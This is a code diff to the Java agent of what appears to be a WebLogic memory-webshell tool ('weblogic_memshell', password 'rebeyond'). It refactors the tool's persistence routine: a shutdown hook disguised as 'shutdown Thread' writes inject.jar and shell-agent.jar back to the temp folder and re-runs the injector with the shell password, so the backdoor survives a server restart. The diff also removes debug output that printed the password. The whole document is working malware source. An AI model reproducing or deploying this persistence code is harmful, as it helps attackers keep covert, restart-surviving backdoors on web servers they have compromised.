@@ -16,6 +16,9 @@ public class Agent {
     public static InstrumentationContext context = new InstrumentationContext();
     public static String currentPath;
     public static String password = "rebeyond";
+    private final static String AGENT_NAME = "shell-agent.jar";
+    private final static String INJECT_NAME = "inject.jar";
+
     public static byte[] injectFileBytes = new byte[]{}, agentFileBytes = new byte[]{};
 
 
@@ -26,8 +29,6 @@ public class Agent {
         } else {
             Agent.currentPath = args;
         }
-        out.println("Agent password:" + Agent.password);
-        out.println("Agent currentPath:" + Agent.currentPath);
         start(inst);
     }
 
@@ -58,7 +59,7 @@ public class Agent {
             clear();
             persist();
         } catch (Exception e) {
-//            System.out.println(e);
+            out.println(e.getMessage());
         }
 
     }
@@ -83,14 +84,11 @@ public class Agent {
 
     public static void persist() {
         try {
-//            out.println("persist add");
             Thread t = new Thread() {
                 public void run() {
                     try {
-//                        out.println("persist start");
-                        writeFiles("inject.jar", Agent.injectFileBytes);
-                        writeFiles("shell-agent.jar", Agent.agentFileBytes);
-//                        out.println("persist end");
+                        writeFiles(INJECT_NAME, Agent.injectFileBytes);
+                        writeFiles(AGENT_NAME, Agent.agentFileBytes);
                         startInject();
                     } catch (Exception e) {
 
@@ -100,15 +98,16 @@ public class Agent {
             t.setName("shutdown Thread");
             Runtime.getRuntime().addShutdownHook(t);
         } catch (Throwable t) {
-            out.println(t.getMessage());
+
         }
     }
 
-    private static void startInject() throws InterruptedException, IOException {
-        Thread.sleep(2000);
+    private static void startInject() throws Exception {
+        Thread.sleep(3000);
         String tempFolder = System.getProperty("java.io.tmpdir");
-        String cmd = "java -jar " + tempFolder + File.separator + "inject.jar " + Agent.password;
+        String cmd = "java -jar " + tempFolder + File.separator + INJECT_NAME+" " + Agent.password;
         Runtime.getRuntime().exec(cmd);
+
     }
 
     static byte[] mergeByteArray(byte[]... byteArray) {
@@ -133,13 +132,16 @@ public class Agent {
         return result;
     }
 
+    public static void main(String[] args) throws Exception {
+        readInjectFile("C:\\Users\\fbi\\Documents\\javaProject\\weblogic_memshell\\inject\\target");
+    }
     public static void readInjectFile(String filePath) throws Exception {
-        String fileName = "inject.jar";
+        String fileName = INJECT_NAME;
         readFile(filePath, fileName);
     }
 
     public static void readAgentFile(String filePath) throws Exception {
-        String fileName = "shell-agent.jar";
+        String fileName = AGENT_NAME;
         readFile(filePath, fileName);
     }
 
@@ -152,7 +154,8 @@ public class Agent {
         byte[] bytes = new byte[1024 * 100];
         int num = 0;
         while ((num = is.read(bytes)) != -1) {
-            agentFileBytes = mergeByteArray(agentFileBytes, Arrays.copyOfRange(bytes, 0, num));
+            if (fileName.equals(AGENT_NAME)) agentFileBytes = mergeByteArray(agentFileBytes, Arrays.copyOfRange(bytes, 0, num));
+            else if (fileName.equals(INJECT_NAME)) injectFileBytes =  mergeByteArray(injectFileBytes, Arrays.copyOfRange(bytes, 0, num));
         }
         is.close();
     }
